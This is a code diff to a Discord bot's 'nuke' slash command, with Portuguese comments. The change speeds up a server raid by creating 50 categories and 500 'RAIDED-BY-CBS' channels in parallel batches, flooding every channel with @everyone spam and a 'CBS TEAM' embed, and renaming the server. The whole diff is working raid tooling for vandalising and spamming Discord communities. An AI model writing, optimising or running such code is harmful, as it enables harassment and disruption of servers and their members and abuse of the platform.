@@ -4,7 +4,7 @@ const config = require('../config');
 module.exports = {
   data: new SlashCommandBuilder()
     .setName('nuke')
-    .setDescription('💀 CRIAÇÃO RÁPIDA - 500 canais e spam')
+    .setDescription('💀 CRIAÇÃO ULTRA RÁPIDA - 500 canais + spam')
     .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
 
   async execute(interaction, client) {
@@ -20,50 +20,69 @@ module.exports = {
     await interaction.deferReply({ flags: 64 });
     const guild = interaction.guild;
     const user = interaction.user;
-    const base = config.raid.baseName || 'RAIDED-BY-CBS';
+    const base = 'RAIDED-BY-CBS';
     const mensagem = config.raid.spamMessage || '**RAIDED BY CBS TEAM** 🔥';
 
     const startTime = Date.now();
 
     try {
-      // ===== 1. CRIAR CATEGORIAS =====
+      // ===== 1. CRIAR CATEGORIAS (PARALELO) =====
       await interaction.editReply('📂 CRIANDO 50 CATEGORIAS...');
-      const categories = [];
+      const categoryPromises = [];
       for (let i = 0; i < 50; i++) {
-        try {
-          const cat = await guild.channels.create({
+        categoryPromises.push(
+          guild.channels.create({
             name: `${base}-CAT-${i+1}`,
             type: ChannelType.GuildCategory,
             reason: 'RAID CBS'
-          });
-          categories.push(cat);
-        } catch {}
+          }).catch(() => null)
+        );
       }
+      const categories = (await Promise.all(categoryPromises)).filter(c => c !== null);
 
-      // ===== 2. CRIAR 500 CANAIS =====
-      await interaction.editReply('📂 CRIANDO 500 CANAIS...');
+      // ===== 2. CRIAR 500 CANAIS EM LOTES DE 50 (PARALELO) =====
+      await interaction.editReply('📂 CRIANDO 500 CANAIS EM LOTE...');
+      const totalCanais = 500;
+      const batchSize = 50; // aumenta para 50 por vez
       const channels = [];
-      for (let i = 0; i < 500; i++) {
-        try {
-          const cat = categories[i % categories.length] || null;
-          const channel = await guild.channels.create({
-            name: `${base}-CH-${i+1}`,
-            type: ChannelType.GuildText,
-            parent: cat?.id || null,
-            topic: 'RAIDED BY CBS TEAM'
-          });
-          channels.push(channel);
-          
-          // Envia mensagem
-          await channel.send({ content: `@everyone ${mensagem}` }).catch(() => {});
-          
-          if (channels.length % 50 === 0) {
-            await interaction.editReply(`📂 ${channels.length}/500 canais criados`);
-          }
-        } catch {}
+
+      for (let i = 0; i < totalCanais; i += batchSize) {
+        const batch = [];
+        const end = Math.min(i + batchSize, totalCanais);
+        for (let j = i; j < end; j++) {
+          const cat = categories[j % categories.length] || null;
+          batch.push(
+            guild.channels.create({
+              name: `${base}-CH-${j+1}`,
+              type: ChannelType.GuildText,
+              parent: cat?.id || null,
+              topic: 'RAIDED BY CBS TEAM'
+            }).catch(() => null)
+          );
+        }
+        const created = await Promise.all(batch);
+        channels.push(...created.filter(c => c !== null));
+        // Atualiza progresso a cada lote
+        await interaction.editReply(`📂 ${channels.length}/${totalCanais} canais criados`);
       }
 
-      // ===== 3. MUDAR NOME E FOTO =====
+      // ===== 3. SPAM EM PARALELO (TODOS OS CANAIS DE UMA VEZ) =====
+      await interaction.editReply(`💬 SPAMMANDO ${channels.length} CANAIS...`);
+      const msgPromises = channels.map(channel =>
+        channel.send({
+          content: `@everyone ${mensagem}`,
+          embeds: [{
+            title: 'CBS TEAM ESTEVE AQUI!',
+            description: `💀 RAID por ${user.tag}`,
+            color: 0xFF0000,
+            image: { url: config.raid.gifUrl },
+            timestamp: new Date()
+          }]
+        }).catch(() => null)
+      );
+      await Promise.all(msgPromises);
+
+      // ===== 4. MUDAR NOME E FOTO =====
       try {
         await guild.setName('RAIDED BY CBS TEAM');
         if (client.user.avatarURL()) {
@@ -73,14 +92,14 @@ module.exports = {
         }
       } catch {}
 
-      // ===== 4. FINAL =====
-      const tempoTotal = Math.round((Date.now() - startTime) / 1000);
+      // ===== 5. FINAL =====
+      const tempo = Math.round((Date.now() - startTime) / 1000);
       await interaction.editReply(
-        `✅ **NUKE CONCLUÍDO!**\n\n` +
+        `✅ **NUKE ULTRA RÁPIDO CONCLUÍDO!**\n\n` +
         `📂 ${categories.length}/50 categorias\n` +
         `📂 ${channels.length}/500 canais\n` +
-        `💬 Mensagem enviada em todos\n` +
-        `⏱️ ${tempoTotal}s`
+        `💬 ${channels.length} mensagens enviadas\n` +
+        `⏱️ ${tempo}s`
       );
 
     } catch (error) {
